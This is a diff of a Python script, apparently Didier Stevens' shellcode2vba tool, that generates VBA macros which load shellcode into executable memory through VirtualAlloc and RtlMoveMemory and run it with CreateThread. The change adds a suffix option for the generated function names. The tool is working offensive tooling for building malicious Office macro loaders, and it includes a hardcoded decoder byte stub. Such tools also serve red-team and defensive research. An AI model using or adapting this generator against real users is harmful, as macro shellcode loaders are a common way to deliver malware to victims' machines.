@@ -2,8 +2,8 @@
 
 __description__ = 'Tool to create a VBA script containing shellcode to execute'
 __author__ = 'Didier Stevens'
-__version__ = '0.4'
-__date__ = '2015/11/29'
+__version__ = '0.5'
+__date__ = '2016/11/16'
 
 """
 
@@ -19,6 +19,7 @@ History:
   2013/04/26: Added base64 encoding for x64
   2015/09/18: V0.4 added option --nocreatethread and --writememory
   2015/11/29: refactoring, added option --start
+  2016/11/16: V0.5 added option -S
 
 Todo:
 """
@@ -26,7 +27,7 @@ Todo:
 import optparse
 import base64
 
-def Shellcode2VBA(filenameShellcode, filenameVBAscript, encoding, x64, nocreatethread, writememory, start):
+def Shellcode2VBA(filenameShellcode, filenameVBAscript, encoding, x64, nocreatethread, writememory, start, suffix):
     fPayload = open(filenameShellcode, 'rb')
     payload = fPayload.read()
     if encoding == 'base64':
@@ -59,7 +60,7 @@ def Shellcode2VBA(filenameShellcode, filenameVBAscript, encoding, x64, nocreatet
     print >> outfile, 'Const PAGE_EXECUTE_READWRITE = &H40'
     print >> outfile, ''
 
-    print >> outfile, ('Public Sub %s()' % start)
+    print >> outfile, ('Public Sub %s()' % (start + suffix))
     print >> outfile, '\tDim sShellCode As String'
     if not x64:
         print >> outfile, '\tDim lpMemory As Long'
@@ -68,7 +69,7 @@ def Shellcode2VBA(filenameShellcode, filenameVBAscript, encoding, x64, nocreatet
         print >> outfile, '\tDim lpMemory As LongPtr'
         print >> outfile, '\tDim lResult As LongPtr'
     print >> outfile, ''
-    print >> outfile, '\tsShellCode = ShellCode()'
+    print >> outfile, '\tsShellCode = ShellCode%s()' % suffix
     print >> outfile, '\tlpMemory = VirtualAlloc(0&, Len(sShellCode), MEM_COMMIT, PAGE_EXECUTE_READWRITE)'
     if writememory == 'move':
         print >> outfile, '\tRtlMoveMemory lpMemory, sShellCode, Len(sShellCode)'
@@ -101,7 +102,7 @@ def Shellcode2VBA(filenameShellcode, filenameVBAscript, encoding, x64, nocreatet
         print >> outfile, 'End Function'
         print >> outfile, ''
 
-    print >> outfile, 'Private Function ShellCode%d() As String' % countSubs
+    print >> outfile, 'Private Function ShellCode%d%s() As String' % (countSubs, suffix)
     print >> outfile, '\tDim sShellCode As String'
     print >> outfile, ''
     print >> outfile, '\tsShellCode = ""'
@@ -123,11 +124,11 @@ def Shellcode2VBA(filenameShellcode, filenameVBAscript, encoding, x64, nocreatet
             if countLine > 99:
                 countLine = 0
                 print >> outfile, ''
-                print >> outfile, '\tShellCode%d = sShellCode' % countSubs
+                print >> outfile, '\tShellCode%d%s = sShellCode' % (countSubs, suffix)
                 print >> outfile, 'End Function'
                 print >> outfile, ''
                 countSubs += 1
-                print >> outfile, 'Private Function ShellCode%d() As String' % countSubs
+                print >> outfile, 'Private Function ShellCode%d%s() As String' % (countSubs, suffix)
                 print >> outfile, '\tDim sShellCode As String'
                 print >> outfile, ''
                 print >> outfile, '\tsShellCode = ""'
@@ -139,11 +140,11 @@ def Shellcode2VBA(filenameShellcode, filenameVBAscript, encoding, x64, nocreatet
             print >> outfile, '\tsShellCode = sShellCode + "%s"' % line
 
     print >> outfile, ''
-    print >> outfile, '\tShellCode%d = sShellCode' % countSubs
+    print >> outfile, '\tShellCode%d%s = sShellCode' % (countSubs, suffix)
     print >> outfile, 'End Function'
     print >> outfile, ''
 
-    print >> outfile, 'Private Function ShellCode() As String'
+    print >> outfile, 'Private Function ShellCode%s() As String' % suffix
     print >> outfile, '\tDim sShellCode As String'
     print >> outfile, ''
     if encoding == 'legacy':
@@ -173,9 +174,9 @@ def Shellcode2VBA(filenameShellcode, filenameVBAscript, encoding, x64, nocreatet
         print >> outfile, '\tsShellCode = sShellCode + chr(&hFF) + chr(&hFF) + chr(&h86) + chr(&hC4) + chr(&hC1) + chr(&hC0) + chr(&h10) + chr(&h86) + chr(&hC4) + chr(&hC1)'
         print >> outfile, '\tsShellCode = sShellCode + chr(&hC8) + chr(&h08) + chr(&h89) + chr(&h01) + chr(&h83) + chr(&hC1) + chr(&h03) + chr(&hEB) + chr(&hD4)'
     for iIter in range(1, countSubs+1):
-        print >> outfile, '\tsShellCode = sShellCode + ShellCode%d()' % iIter
+        print >> outfile, '\tsShellCode = sShellCode + ShellCode%d%s()' % (iIter, suffix)
     print >> outfile, ''
-    print >> outfile, '\tShellCode = sShellCode'
+    print >> outfile, '\tShellCode%s = sShellCode' % suffix
     print >> outfile, 'End Function'
 
     outfile.close()
@@ -187,6 +188,7 @@ def Main():
     oParser.add_option('-n', '--nocreatethread', action='store_true', default=False, help='do not call CreateThread')
     oParser.add_option('-w', '--writememory', default='move', help='select how to write to memory: move (default) or process')
     oParser.add_option('-s', '--start', default='ExecuteShellCode', help='name of start Sub (default ExecuteShellCode)')
+    oParser.add_option('-S', '--suffix', default='', help='Suffix for function names')
     (options, args) = oParser.parse_args()
 
     if len(args) != 2 or not options.encoding in ('legacy', 'base64') or not options.writememory in ('move', 'process'):
@@ -199,7 +201,7 @@ def Main():
         return
 
     else:
-        Shellcode2VBA(args[0], args[1], options.encoding, options.x64, options.nocreatethread, options.writememory, options.start)
+        Shellcode2VBA(args[0], args[1], options.encoding, options.x64, options.nocreatethread, options.writememory, options.start, options.suffix)
 
 if __name__ == '__main__':
     Main()
